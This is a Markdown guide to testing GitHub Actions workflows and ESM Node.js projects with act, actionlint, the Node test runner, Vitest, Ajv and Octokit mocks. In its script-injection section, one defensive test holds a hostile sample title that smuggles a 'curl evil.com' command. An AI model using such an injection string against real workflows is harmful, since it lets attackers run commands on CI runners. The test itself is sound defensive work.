# Comprehensive Testing Guide for GitHub Actions and Node.js Automation

**Version**: 1.0.0
**Last Updated**: 2025-11-09
**Target Environment**: Node.js v20+ with ESM modules

---

## Table of Contents

1. [GitHub Actions Testing](#1-github-actions-testing)
2. [Node.js Testing Frameworks](#2-nodejs-testing-frameworks)
3. [Validation Testing](#3-validation-testing)
4. [Integration Testing](#4-integration-testing)
5. [Security and Best Practices](#5-security-and-best-practices)
6. [Quick Start Templates](#6-quick-start-templates)

---

## 1. GitHub Actions Testing

### 1.1 Official Documentation

- **Primary Resource**: https://docs.github.com/en/actions
- **Building and Testing**: https://docs.github.com/en/actions/automating-builds-and-tests
- **Node.js Specific**: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-nodejs
- **Workflow Syntax**: https://docs.github.com/en/actions/writing-workflows

### 1.2 Testing Workflows Locally with `act`

**Repository**: https://github.com/nektos/act

**Installation**:

```bash
# macOS/Linux (Homebrew)
brew install act

# Windows (Scoop)
scoop install act

# Or via shell script
curl https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash
```

**Basic Usage**:

```bash
# Run all workflows
act

# Run specific event
act push

# Run specific job
act -j test

# Dry run to see what would execute
act -n

# Use specific Docker image
act -P ubuntu-latest=catthehacker/ubuntu:act-latest
```

**Limitations**:

- Doesn't fully replicate GitHub-hosted runner environments
- Custom images specified in workflows may be ignored
- Some GitHub-specific features unavailable
- Requires Docker to be installed

**Benefits**:

- 70-90% reduction in workflow debug time
- Immediate feedback without commit-push cycle
- Test changes before pushing to GitHub

### 1.3 Matrix Strategy for Test Coverage

**Official Documentation**: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow

**Basic Matrix Example**:

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node-version: [18.x, 20.x, 22.x]
        # Creates 9 jobs (3 OS × 3 Node versions)
```

**Using `include` to Extend Configurations**:

```yaml
strategy:
  matrix:
    node-version: [18, 20]
    os: [ubuntu-latest, windows-latest]
    include:
      # Add specific configuration
      - node-version: 22
        os: ubuntu-latest
        experimental: true
      # Add variables to existing combinations
      - os: ubuntu-latest
        npm-cache: ~/.npm
```

**Using `exclude` to Remove Combinations**:

```yaml
strategy:
  matrix:
    os: [macos-latest, windows-latest, ubuntu-latest]
    node-version: [18, 20, 22]
    exclude:
      # Don't test Node 18 on macOS
      - os: macos-latest
        node-version: 18
      # Don't test Node 22 on Windows
      - os: windows-latest
        node-version: 22
```

**Failure Handling**:

```yaml
strategy:
  # Cancel all jobs if one fails (default: true)
  fail-fast: false

  # Limit concurrent jobs
  max-parallel: 2

  matrix:
    node-version: [18, 20, 22]
    include:
      # Allow experimental versions to fail
      - node-version: 23
        experimental: true

jobs:
  test:
    continue-on-error: ${{ matrix.experimental == true }}
```

**Dynamic Matrices from Job Outputs**:

```yaml
jobs:
  generate-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          echo 'matrix={"node":[18,20,22],"os":["ubuntu-latest"]}' >> $GITHUB_OUTPUT

  test:
    needs: generate-matrix
    strategy:
      matrix: ${{ fromJSON(needs.generate-matrix.outputs.matrix) }}
```

### 1.4 Secrets and Environment Variables in Tests

**Official Documentation**: https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions

**Accessing Secrets**:

```yaml
steps:
  - name: Run tests with API credentials
    env:
      API_KEY: ${{ secrets.API_KEY }}
      DATABASE_URL: ${{ secrets.DATABASE_URL }}
    run: npm test
```

**Best Practices**:

1. **Never pass secrets via command line**:

   ```yaml
   # BAD - visible in process list
   - run: ./script.sh ${{ secrets.API_KEY }}

   # GOOD - use environment variables
   - env:
       API_KEY: ${{ secrets.API_KEY }}
     run: ./script.sh
   ```

2. **Cannot use secrets directly in conditionals**:

   ```yaml
   # BAD - doesn't work
   - if: ${{ secrets.API_KEY == 'value' }}

   # GOOD - set as env var first
   env:
     API_KEY: ${{ secrets.API_KEY }}
   steps:
     - if: env.API_KEY != ''
   ```

3. **Mask dynamically generated secrets**:

   ```yaml
   - name: Generate token
     run: |
       TOKEN=$(generate-token)
       echo "::add-mask::$TOKEN"
       echo "TOKEN=$TOKEN" >> $GITHUB_ENV
   ```

4. **Rotate secrets regularly** (30-90 days)
5. **Use OIDC tokens** instead of long-lived credentials when possible
6. **Scope secrets appropriately** (environment > repository > organization)

**Testing Without Real Secrets**:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      # Use dummy values for testing
      API_KEY: ${{ secrets.API_KEY || 'test-key-123' }}
    steps:
      - run: npm test
```

### 1.5 Workflow Syntax Validation with actionlint

**Repository**: https://github.com/rhysd/actionlint
**Documentation**: https://rhysd.github.io/actionlint/
**Version**: v1.7.8 (latest as of 2025)

**Installation**:

```bash
# Via Go
go install github.com/rhysd/actionlint/cmd/actionlint@latest

# Via Homebrew
brew install actionlint

# Or download pre-built binary from releases
```

**Usage**:

```bash
# Validate all workflows
actionlint

# Validate specific file
actionlint .github/workflows/test.yml

# Output in different formats
actionlint -format '{{json .}}'

# Ignore specific errors
actionlint -ignore 'property "key" is not defined'
```

**Checks Performed**:

1. **Syntax validation** - Unexpected or missing keys
2. **Expression type checking** - Semantic errors in `${{ }}` expressions
3. **Action input/output verification** - Validates `with:` parameters
4. **Reusable workflow checks** - Validates inputs, outputs, secrets
5. **Script analysis** - Integrates shellcheck and pyflakes
6. **Security validation** - Detects script injection risks
7. **Additional checks** - Glob patterns, job dependencies, runner labels, cron syntax

**Integration with GitHub Actions**:

```yaml
name: Lint Workflows
on: [push, pull_request]

jobs:
  actionlint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Download actionlint
        run: |
          bash <(curl https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)

      - name: Run actionlint
        run: ./actionlint -color
```

**Configuration** (`actionlint.yaml`):

```yaml
self-hosted-runner:
  labels:
    - my-custom-runner
    - gpu-enabled

config-variables:
  CUSTOM_VAR: value
```

---

## 2. Node.js Testing Frameworks

### 2.1 Native Node.js Test Runner (Recommended for ESM)

**Official Documentation**: https://nodejs.org/api/test.html (Node.js v25.1.0)
**Tutorial**: https://nodejs.org/en/learn/test-runner/using-test-runner

**Requirements**: Node.js v20+ (stable), v18+ (experimental)

**Basic Setup**:

```javascript
// test/example.test.js
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sum } from '../src/sum.js';

test('adds 1 + 2 to equal 3', () => {
  assert.strictEqual(sum(1, 2), 3);
});

test('async test', async () => {
  const result = await fetchData();
  assert.ok(result);
});
```

**Running Tests**:

```bash
# Run all tests
node --test

# Run specific pattern
node --test "**/*.test.js"

# With coverage
node --test --experimental-test-coverage

# Watch mode
node --test --watch

# Specific files
node --test test/unit/*.test.js
```

**Test Hooks**:

```javascript
import { describe, it, before, after, beforeEach, afterEach } from 'node:test';

describe('Database tests', () => {
  let db;

  before(async () => {
    db = await connectDB();
  });

  after(async () => {
    await db.close();
  });

  beforeEach(async () => {
    await db.clear();
  });

  afterEach(async () => {
    await db.verify();
  });

  it('inserts record', async () => {
    const id = await db.insert({ name: 'test' });
    assert.ok(id);
  });
});
```

**Mocking**:

```javascript
import { mock, test } from 'node:test';
import assert from 'node:assert/strict';

test('mock function', (t) => {
  const fn = t.mock.fn((a, b) => a + b);

  assert.strictEqual(fn(2, 3), 5);
  assert.strictEqual(fn.mock.callCount(), 1);
  assert.deepStrictEqual(fn.mock.calls[0].arguments, [2, 3]);
});

test('mock method', (t) => {
  const obj = {
    getValue: () => 10,
  };

  t.mock.method(obj, 'getValue', () => 20);
  assert.strictEqual(obj.getValue(), 20);
});

test('mock timers', (t) => {
  const fn = t.mock.fn();

  t.mock.timers.enable({ apis: ['setTimeout'] });
  setTimeout(fn, 1000);

  assert.strictEqual(fn.mock.callCount(), 0);
  t.mock.timers.tick(1000);
  assert.strictEqual(fn.mock.callCount(), 1);
});
```

**Snapshot Testing** (v22.3.0+):

```javascript
test('snapshot', (t) => {
  const data = { id: 1, name: 'test' };
  t.assert.snapshot(data);
});
```

Run with `--test-update-snapshots` to generate/update snapshots.

**Code Coverage**:

```bash
# Generate coverage report
node --test --experimental-test-coverage

# With minimum thresholds
node --test --experimental-test-coverage \
  --test-coverage-branches=80 \
  --test-coverage-functions=80 \
  --test-coverage-lines=80
```

**Filtering Tests**:

```bash
# By name pattern
node --test --test-name-pattern="user.*"

# Skip specific tests
node --test --test-skip-pattern="slow"

# Run only marked tests
node --test --test-only
```

**Package.json Configuration**:

```json
{
  "type": "module",
  "scripts": {
    "test": "node --test",
    "test:watch": "node --test --watch",
    "test:coverage": "node --test --experimental-test-coverage"
  }
}
```

### 2.2 Vitest (Modern Alternative to Jest)

**Official Documentation**: https://vitest.dev
**Repository**: https://github.com/vitest-dev/vitest

**Why Vitest?**

- ESM-first design
- Fast (leverages Vite's transformation pipeline)
- Jest-compatible API
- TypeScript support out of the box
- Native watch mode
- Browser mode for DOM testing

**Installation**:

```bash
npm install -D vitest

# With coverage
npm install -D vitest @vitest/coverage-v8
```

**Requirements**: Vite ≥v6.0.0, Node ≥v20.0.0

**Basic Configuration** (`vitest.config.ts`):

```typescript
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    environment: 'node', // or 'jsdom', 'happy-dom'
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html'],
      exclude: ['**/node_modules/**', '**/test/**'],
    },
  },
});
```

**For Pure ESM** (`package.json`):

```json
{
  "type": "module",
  "scripts": {
    "test": "vitest",
    "test:ui": "vitest --ui",
    "test:coverage": "vitest --coverage"
  }
}
```

**Example Test**:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { UserService } from './UserService.js';

describe('UserService', () => {
  let service;

  beforeEach(() => {
    service = new UserService();
  });

  it('creates user', async () => {
    const user = await service.create({ name: 'John' });
    expect(user).toHaveProperty('id');
    expect(user.name).toBe('John');
  });

  it('validates email', () => {
    expect(() => {
      service.validateEmail('invalid');
    }).toThrow('Invalid email');
  });
});
```

**Mocking in Vitest**:

```javascript
import { vi } from 'vitest';

// Mock module
vi.mock('./api.js', () => ({
  fetchData: vi.fn(() => Promise.resolve({ data: 'test' })),
}));

// Spy on method
const spy = vi.spyOn(obj, 'method');

// Mock timers
vi.useFakeTimers();
setTimeout(() => {}, 1000);
vi.advanceTimersByTime(1000);
vi.useRealTimers();

// Mock Date
vi.setSystemTime(new Date('2025-01-01'));
```

**Snapshot Testing**:

```javascript
it('matches snapshot', () => {
  const data = { id: 1, name: 'test' };
  expect(data).toMatchSnapshot();
});
```

**Comparison: Vitest vs Jest vs Node Test Runner**

| Feature          | Node Test Runner | Vitest    | Jest            |
| ---------------- | ---------------- | --------- | --------------- |
| ESM Support      | Native           | Native    | Requires config |
| Speed            | Fast             | Very Fast | Moderate        |
| Configuration    | Minimal          | Minimal   | Complex         |
| Mocking          | Basic            | Advanced  | Advanced        |
| Browser Testing  | No               | Yes       | Limited         |
| Watch Mode       | v19.2.0+         | Built-in  | Built-in        |
| Snapshot Testing | v22.3.0+         | Built-in  | Built-in        |
| TypeScript       | Via loader       | Native    | Via transform   |

### 2.3 Jest with ESM (Legacy Compatibility)

**Documentation**: https://jestjs.io/docs/ecmascript-modules

**Configuration for ESM** (`package.json`):

```json
{
  "type": "module",
  "scripts": {
    "test": "node --experimental-vm-modules node_modules/jest/bin/jest"
  }
}
```

**Jest Config** (`jest.config.js`):

```javascript
export default {
  testEnvironment: 'node',
  transform: {},
  extensionsToTreatAsEsm: ['.js'],
  moduleNameMapper: {
    '^(\\.{1,2}/.*)\\.js$': '$1',
  },
};
```

**Note**: As of 2025, still requires `--experimental-vm-modules` flag. Consider Vitest or Node Test Runner for better ESM support.

---

## 3. Validation Testing

### 3.1 YAML Schema Validation

**Approach**: Use `js-yaml` + JSON Schema validation with `ajv`

**Installation**:

```bash
npm install js-yaml ajv
```

**Example Implementation**:

```javascript
// validators/workflow-validator.js
import YAML from 'js-yaml';
import Ajv from 'ajv';
import { readFile } from 'fs/promises';

const ajv = new Ajv({ allErrors: true });

const workflowSchema = {
  type: 'object',
  required: ['name', 'on', 'jobs'],
  properties: {
    name: { type: 'string', minLength: 1 },
    on: {
      oneOf: [{ type: 'string' }, { type: 'array' }, { type: 'object' }],
    },
    jobs: {
      type: 'object',
      minProperties: 1,
    },
  },
};

const validate = ajv.compile(workflowSchema);

export async function validateWorkflow(filePath) {
  const content = await readFile(filePath, 'utf8');
  const data = YAML.load(content);

  const valid = validate(data);

  if (!valid) {
    return {
      valid: false,
      errors: validate.errors,
    };
  }

  return { valid: true };
}
```

**Test Example**:

```javascript
// test/workflow-validator.test.js
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateWorkflow } from '../validators/workflow-validator.js';

test('valid workflow passes validation', async () => {
  const result = await validateWorkflow('.github/workflows/test.yml');
  assert.ok(result.valid);
});

test('invalid workflow fails validation', async () => {
  const result = await validateWorkflow('test/fixtures/invalid-workflow.yml');
  assert.strictEqual(result.valid, false);
  assert.ok(result.errors.length > 0);
});
```

### 3.2 JSON Schema Validation with Ajv

**Official Documentation**: https://ajv.js.org
**Getting Started**: https://ajv.js.org/guide/getting-started.html

**Installation**:

```bash
# Latest version (draft-2020-12)
npm install ajv

# For older draft support
npm install ajv@6
```

**Basic Usage**:

```javascript
import Ajv from 'ajv';

const ajv = new Ajv({ allErrors: true });

const schema = {
  type: 'object',
  properties: {
    name: { type: 'string' },
    age: { type: 'integer', minimum: 0 },
    email: { type: 'string', format: 'email' },
  },
  required: ['name', 'email'],
  additionalProperties: false,
};

const validate = ajv.compile(schema);

const data = { name: 'John', email: 'john@example.com', age: 30 };
const valid = validate(data);

if (!valid) {
  console.error(validate.errors);
}
```

**With TypeScript**:

```typescript
import Ajv, { JSONSchemaType } from 'ajv';

interface User {
  name: string;
  email: string;
  age?: number;
}

const schema: JSONSchemaType<User> = {
  type: 'object',
  properties: {
    name: { type: 'string' },
    email: { type: 'string', format: 'email' },
    age: { type: 'integer', nullable: true },
  },
  required: ['name', 'email'],
  additionalProperties: false,
};

const ajv = new Ajv();
const validate = ajv.compile(schema);
```

**Validation Factory Pattern** (Recommended):

```javascript
// validators/schema-validator.js
import Ajv from 'ajv';
import addFormats from 'ajv-formats';

const ajv = new Ajv({ allErrors: true });
addFormats(ajv); // Add format validators (email, uri, etc.)

export function createValidator(schema) {
  const validate = ajv.compile(schema);

  return (data) => {
    const valid = validate(data);

    if (!valid) {
      throw new Error(`Validation failed: ${JSON.stringify(validate.errors, null, 2)}`);
    }

    return true;
  };
}

// Usage
const userValidator = createValidator(userSchema);
userValidator(userData); // Throws if invalid
```

**Testing with Ajv**:

```javascript
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createValidator } from '../validators/schema-validator.js';

const issueSchema = {
  type: 'object',
  properties: {
    title: { type: 'string', minLength: 10 },
    labels: {
      type: 'array',
      items: { type: 'string' },
      minItems: 1,
    },
  },
  required: ['title', 'labels'],
};

test('valid issue data passes validation', () => {
  const validator = createValidator(issueSchema);
  const data = {
    title: 'Test issue title',
    labels: ['bug', 'priority:high'],
  };

  assert.doesNotThrow(() => validator(data));
});

test('invalid issue data fails validation', () => {
  const validator = createValidator(issueSchema);
  const data = {
    title: 'Short', // Too short
    labels: [], // Empty array
  };

  assert.throws(() => validator(data), /Validation failed/);
});
```

### 3.3 Label Taxonomy Enforcement

**Example Implementation**:

```javascript
// validators/label-validator.js
const VALID_LABEL_PREFIXES = ['type:', 'priority:', 'status:', 'validation:', 'scope:'];

const LABEL_SCHEMA = {
  type: 'array',
  items: {
    type: 'string',
    pattern: '^(type|priority|status|validation|scope):[a-z-]+$',
  },
  minItems: 1,
};

export function validateLabels(labels) {
  const errors = [];

  for (const label of labels) {
    const hasValidPrefix = VALID_LABEL_PREFIXES.some((prefix) => label.startsWith(prefix));

    if (!hasValidPrefix) {
      errors.push(`Invalid label: ${label}`);
    }
  }

  const hasTypeLabel = labels.some((l) => l.startsWith('type:'));
  if (!hasTypeLabel) {
    errors.push('Missing required type: label');
  }

  return {
    valid: errors.length === 0,
    errors,
  };
}
```

**Test Example**:

```javascript
test('validates label taxonomy', () => {
  const valid = validateLabels(['type:test', 'priority:high']);
  assert.ok(valid.valid);

  const invalid = validateLabels(['invalid-label']);
  assert.strictEqual(invalid.valid, false);
  assert.ok(invalid.errors.length > 0);
});
```

---

## 4. Integration Testing

### 4.1 Testing GitHub API Interactions with Octokit

**Official Repository**: https://github.com/octokit/octokit.js

**Installation**:

```bash
npm install @octokit/rest
npm install -D @octokit/fixtures nock
```

**Basic Octokit Usage**:

```javascript
import { Octokit } from '@octokit/rest';

const octokit = new Octokit({
  auth: process.env.GITHUB_TOKEN,
});

const { data: issue } = await octokit.rest.issues.get({
  owner: 'owner',
  repo: 'repo',
  issue_number: 123,
});
```

**Mocking with @octokit/fixtures**:

```javascript
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { Octokit } from '@octokit/rest';
import { fixtures } from '@octokit/fixtures';

test('creates issue comment', async () => {
  const mock = fixtures.mock('GET /repos/:owner/:repo/issues/:issue_number');

  const octokit = new Octokit({
    baseUrl: 'https://api.github.com',
    request: {
      fetch: mock.fetchHandler,
    },
  });

  const { data } = await octokit.rest.issues.get({
    owner: 'test',
    repo: 'test',
    issue_number: 1,
  });

  assert.ok(data);
});
```

**Mocking with nock** (Alternative):

```javascript
import nock from 'nock';

test('mocks GitHub API with nock', async () => {
  nock('https://api.github.com').get('/repos/test/test/issues/1').reply(200, {
    id: 1,
    number: 1,
    title: 'Test issue',
    state: 'open',
  });

  const octokit = new Octokit();
  const { data } = await octokit.rest.issues.get({
    owner: 'test',
    repo: 'test',
    issue_number: 1,
  });

  assert.strictEqual(data.title, 'Test issue');
});
```

**Custom Fetch Method** (Recommended):

```javascript
import { test } from 'node:test';

test('custom fetch for testing', async () => {
  const mockFetch = async (url, options) => {
    return {
      ok: true,
      status: 200,
      json: async () => ({ id: 1, title: 'Test' }),
    };
  };

  const octokit = new Octokit({
    request: { fetch: mockFetch },
  });

  const { data } = await octokit.request('GET /repos/:owner/:repo/issues/:issue_number', {
    owner: 'test',
    repo: 'test',
    issue_number: 1,
  });

  assert.strictEqual(data.title, 'Test');
});
```

### 4.2 Testing github-script Actions

**Repository**: https://github.com/actions/github-script

**Workflow Testing Pattern**:

```yaml
# .github/workflows/test-github-script.yml
name: Test GitHub Script

on:
  pull_request:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/github-script@v7
        id: test-script
        with:
          result-encoding: string
          script: |
            const issue = await github.rest.issues.get({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number
            });

            return issue.data.title;

      - name: Verify result
        env:
          RESULT: ${{ steps.test-script.outputs.result }}
        run: |
          if [ -z "$RESULT" ]; then
            echo "Error: No result returned"
            exit 1
          fi
          echo "Success: $RESULT"
```

**Testing Script Files**:

```javascript
// scripts/label-checker.js
export default async ({ github, context, core }) => {
  const { data: labels } = await github.rest.issues.listLabelsOnIssue({
    owner: context.repo.owner,
    repo: context.repo.repo,
    issue_number: context.issue.number,
  });

  const hasTypeLabel = labels.some((l) => l.name.startsWith('type:'));

  if (!hasTypeLabel) {
    core.setFailed('Missing required type: label');
  }

  return labels.map((l) => l.name);
};
```

**Unit Test for Script**:

```javascript
// test/label-checker.test.js
import { test } from 'node:test';
import assert from 'node:assert/strict';
import labelChecker from '../scripts/label-checker.js';

test('passes when type label exists', async () => {
  const mockGithub = {
    rest: {
      issues: {
        listLabelsOnIssue: async () => ({
          data: [{ name: 'type:bug' }, { name: 'priority:high' }],
        }),
      },
    },
  };

  const mockContext = {
    repo: { owner: 'test', repo: 'test' },
    issue: { number: 1 },
  };

  const mockCore = {
    setFailed: (msg) => {
      throw new Error(msg);
    },
  };

  const labels = await labelChecker({
    github: mockGithub,
    context: mockContext,
    core: mockCore,
  });

  assert.ok(labels.includes('type:bug'));
});

test('fails when type label missing', async () => {
  const mockGithub = {
    rest: {
      issues: {
        listLabelsOnIssue: async () => ({
          data: [{ name: 'priority:high' }],
        }),
      },
    },
  };

  const mockContext = {
    repo: { owner: 'test', repo: 'test' },
    issue: { number: 1 },
  };

  const mockCore = {
    setFailed: (msg) => {
      throw new Error(msg);
    },
  };

  await assert.rejects(
    async () =>
      await labelChecker({
        github: mockGithub,
        context: mockContext,
        core: mockCore,
      }),
    /Missing required type: label/
  );
});
```

### 4.3 Testing Multi-Step Workflows

**Strategy**: Test each job/step independently, then test integration

**Example Workflow** (`.github/workflows/test-pipeline.yml`):

```yaml
name: Test Pipeline

on:
  push:
    branches: [main]

jobs:
  validate:
    runs-on: ubuntu-latest
    outputs:
      status: ${{ steps.validate.outputs.status }}
    steps:
      - uses: actions/checkout@v4

      - name: Validate
        id: validate
        run: |
          npm ci
          npm run validate
          echo "status=success" >> $GITHUB_OUTPUT

  test:
    needs: validate
    if: needs.validate.outputs.status == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run tests
        run: |
          npm ci
          npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Deploy
        run: echo "Deploying..."
```

**Testing Approach**:

1. **Test individual scripts locally**:

```bash
# Test validation step
npm run validate

# Test in isolated environment with act
act -j validate
```

2. **Test job dependencies**:

```yaml
# Create test workflow that exercises job outputs
name: Test Job Outputs

on: workflow_dispatch

jobs:
  test-outputs:
    runs-on: ubuntu-latest
    steps:
      - name: Test validate output
        run: |
          # Simulate validate job
          echo "status=success" >> $GITHUB_OUTPUT

      - name: Verify output consumed
        if: steps.test-validate.outputs.status == 'success'
        run: echo "Output verification passed"
```

3. **Integration testing with test repository**:
   - Create a dedicated test repository
   - Use workflow_dispatch to trigger tests
   - Verify end-to-end behavior

### 4.4 End-to-End Testing Example

**Test Structure**:

```
test/
├── unit/              # Individual function tests
├── integration/       # API interaction tests
├── e2e/              # Full workflow tests
└── fixtures/         # Test data
    ├── workflows/
    ├── issues/
    └── responses/
```

**E2E Test Example**:

```javascript
// test/e2e/issue-validation.test.js
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { Octokit } from '@octokit/rest';

describe('Issue Validation E2E', () => {
  let octokit;
  let testIssue;

  before(async () => {
    octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });

    // Create test issue
    const { data } = await octokit.rest.issues.create({
      owner: process.env.TEST_REPO_OWNER,
      repo: process.env.TEST_REPO_NAME,
      title: 'Test Issue',
      body: '### Test ID\nT-001\n\n### Purpose\nTest validation',
      labels: ['type:test'],
    });

    testIssue = data;
  });

  test('validates issue format', async () => {
    // Trigger validation workflow
    await octokit.rest.repos.createDispatchEvent({
      owner: process.env.TEST_REPO_OWNER,
      repo: process.env.TEST_REPO_NAME,
      event_type: 'validate',
      client_payload: {
        issue_number: testIssue.number,
      },
    });

    // Wait for workflow completion
    await new Promise((resolve) => setTimeout(resolve, 5000));

    // Verify labels updated
    const { data: issue } = await octokit.rest.issues.get({
      owner: process.env.TEST_REPO_OWNER,
      repo: process.env.TEST_REPO_NAME,
      issue_number: testIssue.number,
    });

    const labels = issue.labels.map((l) => l.name);
    assert.ok(labels.includes('validation:pending'));
  });

  after(async () => {
    // Cleanup: Close test issue
    if (testIssue) {
      await octokit.rest.issues.update({
        owner: process.env.TEST_REPO_OWNER,
        repo: process.env.TEST_REPO_NAME,
        issue_number: testIssue.number,
        state: 'closed',
      });
    }
  });
});
```

---

## 5. Security and Best Practices

### 5.1 Testing with Secrets

**DO**:

- Use test/staging secrets separate from production
- Validate secret format without exposing values
- Use secret scanning tools (GitHub Advanced Security)
- Rotate test secrets regularly

**DON'T**:

- Hardcode secrets in test files
- Log secrets (even test ones)
- Commit .env files with real secrets

**Mock Secrets for Local Testing**:

```javascript
// test/setup.js
import { config } from 'dotenv';

// Load test secrets from .env.test
config({ path: '.env.test' });

// Override with mock values if not set
process.env.API_KEY = process.env.API_KEY || 'test-api-key-12345';
process.env.SECRET_TOKEN = process.env.SECRET_TOKEN || 'test-token';
```

**.gitignore**:

```
.env
.env.test
.env.local
*.secrets
```

**Example .env.test.example**:

```bash
# Copy to .env.test and fill with test values
API_KEY=your-test-api-key
DATABASE_URL=sqlite::memory:
GITHUB_TOKEN=ghp_test_token_xxxxx
```

### 5.2 Preventing Script Injection

**AVOID** (Vulnerable):

```yaml
- name: Dangerous
  run: echo "${{ github.event.issue.title }}"
```

**USE** (Safe):

```yaml
- name: Safe
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

**Testing Script Injection Prevention**:

```javascript
test('prevents script injection in title', async () => {
  const maliciousTitle = '"; curl evil.com; echo "';

  // Your sanitization function
  const sanitized = sanitizeInput(maliciousTitle);

  // Should escape or remove dangerous characters
  assert.doesNotMatch(sanitized, /[;`$]/);
});
```

### 5.3 Workflow Security Checklist

- [ ] No hardcoded secrets
- [ ] User input passed via environment variables
- [ ] Dependabot PRs don't expose secrets
- [ ] Third-party actions pinned to SHA (not tag)
- [ ] Minimal permissions (GITHUB_TOKEN)
- [ ] Script injection tests in place
- [ ] actionlint passes
- [ ] Secrets rotated regularly

---

## 6. Quick Start Templates

### 6.1 Basic Node.js Test Workflow

```yaml
# .github/workflows/test.yml
name: Test

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        node-version: [18.x, 20.x, 22.x]

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

      - name: Run coverage
        if: matrix.node-version == '20.x'
        run: npm run test:coverage
```

### 6.2 YAML Validation Workflow

```yaml
# .github/workflows/validate-yaml.yml
name: Validate YAML

on: [push, pull_request]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install actionlint
        run: |
          bash <(curl https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)

      - name: Run actionlint
        run: ./actionlint -color

      - name: Validate with yamllint
        run: |
          pip install yamllint
          yamllint .github/workflows/
```

### 6.3 Package.json Test Scripts

```json
{
  "type": "module",
  "scripts": {
    "test": "node --test",
    "test:watch": "node --test --watch",
    "test:coverage": "node --test --experimental-test-coverage",
    "test:unit": "node --test test/unit/**/*.test.js",
    "test:integration": "node --test test/integration/**/*.test.js",
    "test:e2e": "node --test test/e2e/**/*.test.js",
    "validate": "node scripts/validate-workflows.js"
  },
  "devDependencies": {
    "js-yaml": "^4.1.0",
    "ajv": "^8.12.0",
    "ajv-formats": "^3.0.1",
    "@octokit/rest": "^20.0.2"
  }
}
```

### 6.4 Complete Test Setup Example

```javascript
// test/setup.js
import { config } from 'dotenv';

// Load test environment
config({ path: '.env.test' });

// Global test setup
process.env.NODE_ENV = 'test';
process.env.LOG_LEVEL = 'error'; // Quiet logs during tests

// Mock GitHub context for local tests
if (!process.env.GITHUB_ACTIONS) {
  process.env.GITHUB_REPOSITORY = 'test/repo';
  process.env.GITHUB_REF = 'refs/heads/main';
  process.env.GITHUB_SHA = 'abc123';
}
```

```javascript
// test/helpers/github.js
export function createMockGithub(overrides = {}) {
  return {
    rest: {
      issues: {
        get: async () => ({ data: { id: 1, title: 'Test' } }),
        createComment: async () => ({ data: { id: 1 } }),
        listLabelsOnIssue: async () => ({ data: [] }),
        ...overrides.issues,
      },
      repos: {
        getContent: async () => ({ data: { content: 'test' } }),
        ...overrides.repos,
      },
    },
  };
}

export function createMockContext(overrides = {}) {
  return {
    repo: { owner: 'test', repo: 'test' },
    issue: { number: 1 },
    eventName: 'issues',
    payload: { issue: { number: 1 } },
    ...overrides,
  };
}
```

```javascript
// test/example.test.js
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createMockGithub, createMockContext } from './helpers/github.js';
import handler from '../scripts/handler.js';

test('processes issue correctly', async () => {
  const github = createMockGithub();
  const context = createMockContext();

  const result = await handler({ github, context });

  assert.ok(result.success);
});
```

---

## 7. Additional Resources

### Official Documentation

**GitHub Actions**:

- Main docs: https://docs.github.com/en/actions
- Workflow syntax: https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions
- Security guides: https://docs.github.com/en/actions/security-guides
- Examples: https://docs.github.com/en/actions/examples

**Node.js**:

- Test runner: https://nodejs.org/api/test.html
- Assert module: https://nodejs.org/api/assert.html
- ESM modules: https://nodejs.org/api/esm.html

**Testing Frameworks**:

- Vitest: https://vitest.dev
- Jest: https://jestjs.io
- Mocha: https://mochajs.org

**Validation**:

- Ajv: https://ajv.js.org
- js-yaml: https://github.com/nodeca/js-yaml
- actionlint: https://github.com/rhysd/actionlint

**GitHub API**:

- Octokit.js: https://github.com/octokit/octokit.js
- GitHub REST API: https://docs.github.com/en/rest
- github-script action: https://github.com/actions/github-script

### Tools

- **act** (local testing): https://github.com/nektos/act
- **actionlint** (workflow linting): https://github.com/rhysd/actionlint
- **yamllint** (YAML linting): https://github.com/adrienverge/yamllint
- **Super-linter** (multi-language): https://github.com/github/super-linter

### Community Resources

- GitHub Actions Community: https://github.community/c/code-to-cloud/github-actions
- Awesome Actions: https://github.com/sdras/awesome-actions
- GitHub Actions Toolkit: https://github.com/actions/toolkit

---

## Summary

This guide covers:

1. **GitHub Actions Testing** - Matrix strategies, local testing with act, workflow validation with actionlint
